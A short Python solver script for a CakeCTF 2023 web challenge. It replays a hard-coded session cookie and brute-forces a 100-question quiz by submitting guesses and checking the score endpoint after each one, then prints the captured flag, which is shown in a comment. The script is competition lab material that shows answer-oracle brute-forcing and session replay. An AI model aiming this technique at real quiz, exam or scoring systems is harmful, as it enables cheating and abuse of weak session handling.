import requests

cookies = {"session": ".eJwNx8ERgCAMBMBeUgEHgSR2A-SYsQbH3nV_-wjvlEsAqMXW1XYpY450BpOK6olcaEQWtjr_M3q6WR_rHM0dRoe8H_vvFKg.ZU9bWw.0C1AyqxSdS-lJS4IO55Pb02_B6k"}
url = "http://towfl.2023.cakectf.com:8888/"
answers = [[None] * 10 for _ in range(10)]
for i in range(10):
    for j in range(10):
        for ans in range(4):
            answers[i][j] = ans
            requests.post(url+"api/submit", json=answers, cookies=cookies)
            result = requests.get(url+"api/score", cookies=cookies).json()
            if result["data"]["score"] == i*10 + j + 1:
                print(result["data"]["score"], result["data"]["flag"])
                break
# CakeCTF{b3_c4ut10us_1f_s3ss10n_1s_cl13nt_s1d3_0r_s3rv3r_s1d3}
